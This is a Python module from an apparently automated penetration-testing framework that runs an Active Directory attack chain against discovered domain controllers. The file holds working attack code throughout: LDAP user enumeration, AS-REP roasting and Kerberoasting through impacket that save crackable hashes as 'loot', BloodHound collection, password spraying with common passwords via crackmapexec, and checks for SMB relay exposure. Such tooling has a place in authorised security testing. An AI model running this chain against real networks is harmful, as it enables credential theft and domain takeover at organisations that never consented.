"""
Active Directory module — dedicated AD enumeration, BloodHound data
collection, Kerberos attack chains, and domain trust mapping.

Uses: ldapsearch, bloodhound-python, impacket suite, crackmapexec/netexec
"""

import re
import logging
from typing import Dict, List, Any
from modules.base import BaseModule
from utils.validators import is_tool_available

logger = logging.getLogger(__name__)


class ActiveDirectoryModule(BaseModule):
    MODULE_NAME = "ad"

    def run(self, previous_results: Dict = None) -> Dict[str, Any]:
        """
        Active Directory attack workflow:
            1. Identify domain controllers from scan results
            2. LDAP anonymous/authenticated enumeration
            3. BloodHound data collection (if creds available)
            4. AS-REP Roasting (no creds needed)
            5. Kerberoasting (requires valid creds)
            6. Password spraying against discovered users
            7. Domain trust mapping
            8. GPO enumeration
        """
        self.log_phase_start("Active Directory Assessment")
        results: Dict[str, Any] = {"status": "running"}

        scan_data = (previous_results or {}).get("scan", {})
        exploit_data = (previous_results or {}).get("exploit", {})
        hosts = scan_data.get("hosts", [])

        # Find potential domain controllers (LDAP + Kerberos + DNS + SMB)
        dc_candidates = self._find_domain_controllers(hosts)
        if not dc_candidates:
            logger.info("[AD] No domain controllers detected in scan results")
            results["status"] = "no_dc_found"
            return results

        logger.info(f"[AD] Potential domain controllers: {len(dc_candidates)}")
        results["domain_controllers"] = dc_candidates

        # Gather credentials from vault if available
        credentials = exploit_data.get("credentials", [])
        has_creds = len(credentials) > 0
        domain = self._detect_domain(dc_candidates, hosts)
        results["domain"] = domain

        if domain:
            logger.info(f"[AD] Detected domain: {domain}")
        else:
            logger.warning("[AD] Could not detect domain name — some attacks may fail")

        for dc in dc_candidates:
            dc_ip = dc["ip"]
            logger.info(f"\n[AD] Targeting DC: {dc_ip}")
            dc_results: Dict[str, Any] = {}

            # ── 1. LDAP Enumeration ──
            dc_results["ldap"] = self._ldap_enumerate(dc_ip, domain, credentials)

            # ── 2. AS-REP Roasting (no creds needed) ──
            if domain:
                dc_results["asrep_roast"] = self._asrep_roast(
                    dc_ip, domain, dc_results.get("ldap", {})
                )

            # ── 3. Kerberoasting (needs creds) ──
            if has_creds and domain:
                dc_results["kerberoast"] = self._kerberoast(dc_ip, domain, credentials)

            # ── 4. BloodHound Collection (needs creds) ──
            if has_creds and domain and is_tool_available("bloodhound-python"):
                dc_results["bloodhound"] = self._bloodhound_collect(
                    dc_ip, domain, credentials
                )

            # ── 5. Password Spraying ──
            users = dc_results.get("ldap", {}).get("users", [])
            if users and not self.config.get("exploitation", "safe_mode", default=True):
                dc_results["password_spray"] = self._password_spray(
                    dc_ip, domain, users
                )

            # ── 6. Domain Trust Mapping ──
            if has_creds:
                dc_results["trusts"] = self._enumerate_trusts(
                    dc_ip, domain, credentials
                )

            # ── 7. GPO Enumeration ──
            if has_creds:
                dc_results["gpo"] = self._enumerate_gpo(dc_ip, domain, credentials)

            # ── 8. SMB Signing Check ──
            dc_results["smb_signing"] = self._check_smb_signing(dc_ip)

            results[dc_ip] = dc_results

        results["status"] = "completed"
        self.log_phase_end("Active Directory Assessment")
        return results

    def _find_domain_controllers(self, hosts: List[Dict]) -> List[Dict]:
        """Identify likely domain controllers from scan data."""
        dcs = []
        dc_ports = {53, 88, 135, 139, 389, 445, 464, 636, 3268, 3269}

        for host in hosts:
            open_ports = {
                p["port"] for p in host.get("ports", []) if p.get("state") == "open"
            }
            # DC heuristic: has LDAP (389) + Kerberos (88) + SMB (445)
            dc_score = len(open_ports & dc_ports)
            if 389 in open_ports and 88 in open_ports:
                dcs.append(
                    {
                        "ip": host.get("ip", ""),
                        "hostname": host.get("hostname", ""),
                        "dc_score": dc_score,
                        "open_ports": sorted(open_ports & dc_ports),
                    }
                )

        return sorted(dcs, key=lambda x: -x["dc_score"])

    def _detect_domain(self, dcs: List[Dict], hosts: List[Dict]) -> str:
        """Attempt to detect the AD domain name."""
        for dc in dcs:
            ip = dc["ip"]
            # Try LDAP rootDSE query
            result = self.runner.run(
                tool_name="ldapsearch",
                args=[
                    "-x",
                    "-H",
                    f"ldap://{ip}",
                    "-s",
                    "base",
                    "-b",
                    "",
                    "defaultNamingContext",
                ],
                timeout=15,
                retries=0,
            )
            if result.success and result.stdout:
                match = re.search(
                    r"defaultNamingContext:\s*(.+)",
                    result.stdout,
                    re.IGNORECASE,
                )
                if match:
                    dn = match.group(1).strip()
                    # Convert DC=lab,DC=local → lab.local
                    parts = re.findall(r"DC=([^,]+)", dn, re.IGNORECASE)
                    if parts:
                        return ".".join(parts)

            # Try from hostname
            hostname = dc.get("hostname", "")
            if "." in hostname:
                parts = hostname.split(".")
                if len(parts) >= 2:
                    return ".".join(parts[1:])

        return ""

    def _ldap_enumerate(self, dc_ip: str, domain: str, credentials: List[Dict]) -> Dict:
        """LDAP enumeration — anonymous first, then authenticated."""
        ldap_results: Dict[str, Any] = {"users": [], "groups": [], "computers": []}

        if not is_tool_available("ldapsearch"):
            logger.debug("ldapsearch not available")
            # Fall back to nmap NSE
            result = self.runner.run(
                tool_name="nmap",
                args=[
                    "-sV",
                    "--script",
                    "ldap-rootdse,ldap-search",
                    "-p",
                    "389,636",
                    dc_ip,
                ],
                timeout=60,
                output_file=f"enum/ldap_{dc_ip}.txt",
            )
            if result.success:
                ldap_results["nmap_ldap"] = result.stdout[:5000]
            return ldap_results

        # Build base DN from domain
        base_dn = ",".join(f"DC={p}" for p in domain.split(".")) if domain else ""

        # Anonymous bind attempt
        anon_result = self.runner.run(
            tool_name="ldapsearch",
            args=[
                "-x",
                "-H",
                f"ldap://{dc_ip}",
                "-b",
                base_dn,
                "-s",
                "sub",
                "(objectClass=user)",
                "sAMAccountName",
                "mail",
                "memberOf",
            ],
            timeout=60,
            output_file=f"enum/ldap_anon_{dc_ip}.txt",
            retries=0,
        )

        if anon_result.success and "sAMAccountName" in anon_result.stdout:
            ldap_results["anonymous_bind"] = True
            logger.warning(f"  [!] LDAP anonymous bind successful on {dc_ip}")
            users = re.findall(r"sAMAccountName:\s*(\S+)", anon_result.stdout)
            ldap_results["users"] = users[:500]  # Cap
            logger.info(f"  LDAP users found: {len(users)}")
        else:
            ldap_results["anonymous_bind"] = False

        # Authenticated enumeration if we have creds
        for cred in credentials:
            if cred.get("service") in ("smb", "microsoft-ds", "ldap"):
                user = cred.get("username", "")
                passwd = cred.get("password", "")
                bind_dn = f"{user}@{domain}" if domain else user

                auth_result = self.runner.run(
                    tool_name="ldapsearch",
                    args=[
                        "-x",
                        "-H",
                        f"ldap://{dc_ip}",
                        "-D",
                        bind_dn,
                        "-w",
                        passwd,
                        "-b",
                        base_dn,
                        "-s",
                        "sub",
                        "(objectClass=user)",
                        "sAMAccountName",
                        "adminCount",
                        "servicePrincipalName",
                        "userAccountControl",
                        "memberOf",
                        "lastLogon",
                    ],
                    timeout=120,
                    output_file=f"enum/ldap_auth_{dc_ip}.txt",
                    retries=0,
                )

                if auth_result.success:
                    ldap_results["authenticated"] = True
                    users = re.findall(r"sAMAccountName:\s*(\S+)", auth_result.stdout)
                    ldap_results["users"] = users[:1000]

                    # Find admin accounts
                    admins = re.findall(
                        r"sAMAccountName:\s*(\S+).*?adminCount:\s*1",
                        auth_result.stdout,
                        re.DOTALL,
                    )
                    ldap_results["admin_accounts"] = admins

                    # Find SPN accounts (Kerberoastable)
                    spn_users = re.findall(
                        r"sAMAccountName:\s*(\S+).*?servicePrincipalName:",
                        auth_result.stdout,
                        re.DOTALL,
                    )
                    ldap_results["spn_accounts"] = spn_users

                    logger.info(
                        f"  LDAP auth enum: {len(users)} users, "
                        f"{len(admins)} admins, {len(spn_users)} SPN accounts"
                    )
                    break

        # Group enumeration
        group_result = self.runner.run(
            tool_name="ldapsearch",
            args=[
                "-x",
                "-H",
                f"ldap://{dc_ip}",
                "-b",
                base_dn,
                "-s",
                "sub",
                "(objectClass=group)",
                "cn",
                "member",
            ],
            timeout=60,
            output_file=f"enum/ldap_groups_{dc_ip}.txt",
            retries=0,
        )
        if group_result.success:
            groups = re.findall(r"cn:\s*(.+)", group_result.stdout)
            ldap_results["groups"] = groups[:200]

        return ldap_results

    def _asrep_roast(self, dc_ip: str, domain: str, ldap_data: Dict) -> Dict:
        """AS-REP Roasting — find accounts without Kerberos pre-auth."""
        if not is_tool_available("impacket-GetNPUsers"):
            return {"available": False}

        self.log_phase_start(f"AS-REP Roasting on {dc_ip}")

        # Use discovered users or try without user list
        users = ldap_data.get("users", [])
        user_file = None
        if users:
            user_file = self.session_dir / f"loot/asrep_users_{dc_ip}.txt"
            user_file.parent.mkdir(parents=True, exist_ok=True)
            user_file.write_text("\n".join(users[:500]))

        args = [
            f"{domain}/",
            "-dc-ip",
            dc_ip,
            "-format",
            "hashcat",
            "-outputfile",
            str(self.session_dir / f"loot/asrep_hashes_{dc_ip}.txt"),
        ]

        if user_file:
            args.extend(["-usersfile", str(user_file)])
        else:
            args.append("-no-pass")

        result = self.runner.run(
            tool_name="impacket-GetNPUsers",
            args=args,
            timeout=120,
            output_file=f"loot/asrep_{dc_ip}_stdout.txt",
            retries=0,
        )

        asrep_data: Dict[str, Any] = {"hashes_found": 0}
        if result.success:
            hash_file = self.session_dir / f"loot/asrep_hashes_{dc_ip}.txt"
            if hash_file.exists():
                hashes = [
                    line for line in hash_file.read_text().split("\n") if line.strip()
                ]
                asrep_data["hashes_found"] = len(hashes)
                if hashes:
                    logger.warning(f"  [!] AS-REP hashes found: {len(hashes)}")
                    # Store in credential vault if available
                    if hasattr(self, "credential_vault") and self.credential_vault:
                        from utils.credential_vault import CredType

                        for h in hashes:
                            user_match = re.match(r"\$krb5asrep\$23\$([^@]+)", h)
                            if user_match:
                                self.credential_vault.add_hash(
                                    username=user_match.group(1),
                                    hash_value=h,
                                    hash_type=CredType.ASREP_HASH,
                                    host=dc_ip,
                                    source_phase="ad",
                                    source_tool="impacket-GetNPUsers",
                                    domain=domain,
                                )

        return asrep_data

    def _kerberoast(self, dc_ip: str, domain: str, credentials: List[Dict]) -> Dict:
        """Kerberoasting — extract TGS tickets for offline cracking."""
        if not is_tool_available("impacket-GetUserSPNs"):
            return {"available": False}

        self.log_phase_start(f"Kerberoasting on {dc_ip}")

        for cred in credentials:
            if cred.get("service") in ("smb", "microsoft-ds", "ldap"):
                user = cred.get("username", "")
                passwd = cred.get("password", "")

                result = self.runner.run(
                    tool_name="impacket-GetUserSPNs",
                    args=[
                        f"{domain}/{user}:{passwd}",
                        "-dc-ip",
                        dc_ip,
                        "-request",
                        "-outputfile",
                        str(self.session_dir / f"loot/kerberoast_{dc_ip}.txt"),
                    ],
                    timeout=120,
                    output_file=f"loot/kerberoast_{dc_ip}_stdout.txt",
                    retries=0,
                )

                kerb_data: Dict[str, Any] = {"hashes_found": 0}
                if result.success:
                    hash_file = self.session_dir / f"loot/kerberoast_{dc_ip}.txt"
                    if hash_file.exists():
                        hashes = [
                            line
                            for line in hash_file.read_text().split("\n")
                            if line.strip()
                        ]
                        kerb_data["hashes_found"] = len(hashes)
                        if hashes:
                            logger.warning(f"  [!] Kerberoast hashes: {len(hashes)}")

                return kerb_data

        return {"no_creds": True}

    def _bloodhound_collect(
        self, dc_ip: str, domain: str, credentials: List[Dict]
    ) -> Dict:
        """BloodHound data collection using bloodhound-python."""
        self.log_phase_start(f"BloodHound collection from {dc_ip}")

        for cred in credentials:
            if cred.get("service") in ("smb", "microsoft-ds", "ldap"):
                user = cred.get("username", "")
                passwd = cred.get("password", "")

                bh_output = self.session_dir / "loot" / "bloodhound"
                bh_output.mkdir(parents=True, exist_ok=True)

                result = self.runner.run(
                    tool_name="bloodhound-python",
                    args=[
                        "-c",
                        "All",
                        "-u",
                        user,
                        "-p",
                        passwd,
                        "-d",
                        domain,
                        "-dc",
                        dc_ip,
                        "-ns",
                        dc_ip,
                        "--zip",
                        "--output-prefix",
                        str(bh_output / "bh"),
                    ],
                    timeout=300,
                    output_file=f"loot/bloodhound_{dc_ip}_stdout.txt",
                    retries=0,
                )

                bh_data: Dict[str, Any] = {"collected": result.success}
                if result.success:
                    zip_files = list(bh_output.glob("*.zip"))
                    bh_data["zip_files"] = [str(f) for f in zip_files]
                    logger.info(
                        f"  BloodHound data collected: {len(zip_files)} file(s). "
                        f"Import into BloodHound GUI for attack path analysis."
                    )

                return bh_data

        return {"no_creds": True}

    def _password_spray(self, dc_ip: str, domain: str, users: List[str]) -> Dict:
        """Password spraying against discovered AD users."""
        if not is_tool_available("crackmapexec") and not is_tool_available("nxc"):
            return {"available": False}

        self.log_phase_start(f"Password spraying on {dc_ip}")

        cme_binary = "crackmapexec" if is_tool_available("crackmapexec") else "nxc"
        spray_passwords = self.config.get("ad", default={}).get(
            "spray_passwords",
            ["Password1", "Welcome1", "Company123", "Spring2025", "Summer2025"],
        )
        lockout_threshold = self.config.get(
            "credentials", "spray_lockout_threshold", default=3
        )
        spray_delay = self.config.get("credentials", "spray_delay", default=30)

        spray_results: Dict[str, Any] = {"attempts": 0, "successes": []}

        user_file = self.session_dir / f"loot/spray_users_{dc_ip}.txt"
        user_file.parent.mkdir(parents=True, exist_ok=True)
        user_file.write_text("\n".join(users[:200]))

        import time

        for pwd in spray_passwords[:lockout_threshold]:
            logger.info(f"  Spraying password: {pwd[:2]}*** against {len(users)} users")

            result = self.runner.run(
                tool_name=cme_binary,
                args=[
                    "smb",
                    dc_ip,
                    "-u",
                    str(user_file),
                    "-p",
                    pwd,
                    "-d",
                    domain,
                    "--continue-on-success",
                ],
                timeout=120,
                output_file=f"loot/spray_{dc_ip}_{pwd[:4]}.txt",
                retries=0,
            )

            spray_results["attempts"] += 1

            if result.success and "+" in result.stdout:
                # Extract successful logins
                for line in result.stdout.split("\n"):
                    if "[+]" in line or "Pwn3d" in line:
                        spray_results["successes"].append(
                            {
                                "password": pwd,
                                "output": line.strip(),
                            }
                        )
                        logger.warning(f"  [!] SPRAY HIT: {line.strip()}")

            # Delay between rounds
            if spray_delay > 0:
                logger.info(f"  Waiting {spray_delay}s before next password...")
                if not self.dry_run:
                    time.sleep(spray_delay)

        return spray_results

    def _enumerate_trusts(
        self, dc_ip: str, domain: str, credentials: List[Dict]
    ) -> Dict:
        """Enumerate domain trusts using LDAP or nmap NSE."""
        result = self.runner.run(
            tool_name="nmap",
            args=[
                "--script",
                "ldap-rootdse",
                "-p",
                "389",
                dc_ip,
            ],
            timeout=30,
            output_file=f"enum/ad_trusts_{dc_ip}.txt",
            retries=0,
        )

        trust_data: Dict[str, Any] = {"raw": ""}
        if result.success:
            trust_data["raw"] = result.stdout[:3000]
        return trust_data

    def _enumerate_gpo(self, dc_ip: str, domain: str, credentials: List[Dict]) -> Dict:
        """Enumerate Group Policy Objects."""
        if not is_tool_available("ldapsearch"):
            return {"available": False}

        base_dn = ",".join(f"DC={p}" for p in domain.split(".")) if domain else ""

        for cred in credentials:
            if cred.get("service") in ("smb", "microsoft-ds", "ldap"):
                user = cred.get("username", "")
                passwd = cred.get("password", "")

                result = self.runner.run(
                    tool_name="ldapsearch",
                    args=[
                        "-x",
                        "-H",
                        f"ldap://{dc_ip}",
                        "-D",
                        f"{user}@{domain}",
                        "-w",
                        passwd,
                        "-b",
                        f"CN=Policies,CN=System,{base_dn}",
                        "-s",
                        "sub",
                        "(objectClass=groupPolicyContainer)",
                        "displayName",
                        "gPCFileSysPath",
                    ],
                    timeout=60,
                    output_file=f"enum/ad_gpo_{dc_ip}.txt",
                    retries=0,
                )

                gpo_data: Dict[str, Any] = {"gpos": []}
                if result.success:
                    names = re.findall(r"displayName:\s*(.+)", result.stdout)
                    paths = re.findall(r"gPCFileSysPath:\s*(.+)", result.stdout)
                    for name, path in zip(names, paths):
                        gpo_data["gpos"].append(
                            {
                                "name": name.strip(),
                                "path": path.strip(),
                            }
                        )
                    logger.info(f"  GPOs found: {len(gpo_data['gpos'])}")

                return gpo_data

        return {"no_creds": True}

    def _check_smb_signing(self, dc_ip: str) -> Dict:
        """Check if SMB signing is enforced (important for relay attacks)."""
        result = self.runner.run(
            tool_name="nmap",
            args=[
                "--script",
                "smb2-security-mode",
                "-p",
                "445",
                dc_ip,
            ],
            timeout=30,
            retries=0,
        )

        signing_data: Dict[str, Any] = {"enforced": True}
        if result.success and result.stdout:
            if (
                "not required" in result.stdout.lower()
                or "signing disabled" in result.stdout.lower()
            ):
                signing_data["enforced"] = False
                signing_data["vulnerable_to_relay"] = True
                logger.warning(
                    f"  [!] SMB signing NOT enforced on {dc_ip} — relay attacks possible"
                )
            else:
                signing_data["enforced"] = True
            signing_data["raw"] = result.stdout[:2000]

        return signing_data
